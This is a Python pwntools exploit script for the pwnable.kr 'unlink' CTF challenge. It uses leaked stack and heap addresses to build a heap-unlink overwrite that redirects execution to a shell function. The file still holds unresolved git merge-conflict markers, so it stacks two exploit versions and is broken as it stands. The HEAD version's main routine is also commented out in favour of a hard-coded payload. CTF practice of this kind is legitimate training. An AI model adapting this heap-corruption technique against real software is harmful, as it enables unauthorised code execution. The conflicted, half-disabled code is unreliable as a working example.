<<<<<<< HEAD
from pwn import *
import sys

def main():
    if(len(sys.argv)!= 2):
        print(f"Correct usage is : {sys.argv[0]} <target machine e.g. remote>")
        exit(1)
    if(sys.argv[1]=="remote"):
# SSH connection details 
        host = 'pwnable.kr'
        port = 2222
        username = 'unlink'
        password = 'guest'

# Establish the SSH connection
        p = ssh(user=username, host=host, port=port, password=password)
# Execute the command on the remote server
        p = p.process('/home/unlink/unlink')
    elif(sys.argv[1]=="local"):
        p = process("./unlink")
    else:
        p = process("./unlink")
  #------------------------------------------------------------#
    p.recvuntil("address leak: ")
    ESP = p.recvuntil("\n")
    ESP=ESP[:-1] # remove \n from ESP
    print(f"Leaked Stack = {ESP}")

    context.log_level = 'debug'

    p.recvuntil("address leak: ")
    heap_leak = p.recvuntil("\n")
    heap_leak=heap_leak[:-1]
    print(f"Leaked heap = {heap_leak}")

    ESP_num = int.from_bytes(ESP, byteorder='little')
    heap_num = int.from_bytes(heap_leak, byteorder='little')
    ESP_num= ESP_num+12
    # offset of: main return addr and leaked addr
    heap_num+=44
    # offset of: leaked heap addr and addr of the shell function saved on the heap
    ESP= ESP_num.to_bytes(len(ESP),byteorder='little')
    get_shell_heap_addr = heap_num.to_bytes(len(heap_leak),byteorder='little')

    get_shell=struct.pack("I",0x080484EB)
    get_shell_2=struct.pack("I",0x080484EB)

    payload= b"\x00"*20 + b"\x21\x00\x00\x00"  
    payload+= ESP
    payload+=get_shell_heap_addr
    payload+=get_shell
    payload+=get_shell_2
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    stack_addr = struct.pack("I",0xffffd6e4+0x10)
    shell_addr=struct.pack("I",0x080484EB)
    heap_addr = struct.pack("I",0x804b5b0+0x24)
    payload= b"AAAAAAAAPPPPCCCC" + heap_addr  + stack_addr + shell_addr
    sys.stdout.buffer.write(payload)
    # main()
=======
import re
from pwn import *
from struct import pack

p = process("./unlink")

stack_leak = int(re.search('0x[^\n]+', p.recvline().decode()).group(0),16)
print(hex(stack_leak))
heap_leak = int(re.search('0x[^\n]+', p.recvline().decode()).group(0),16)
print(hex(heap_leak))
ret = stack_leak + 16
shell = 0x80484eb
heap = heap_leak + 8
p.sendline(pack('<I', shell) + b"A" * 12 + pack('<I', ret - 4) + pack('<I', heap + 4))
p.interactive()
>>>>>>> 1c76dcad71ac0b508686bb6e3dcd29cd5a77a8dd
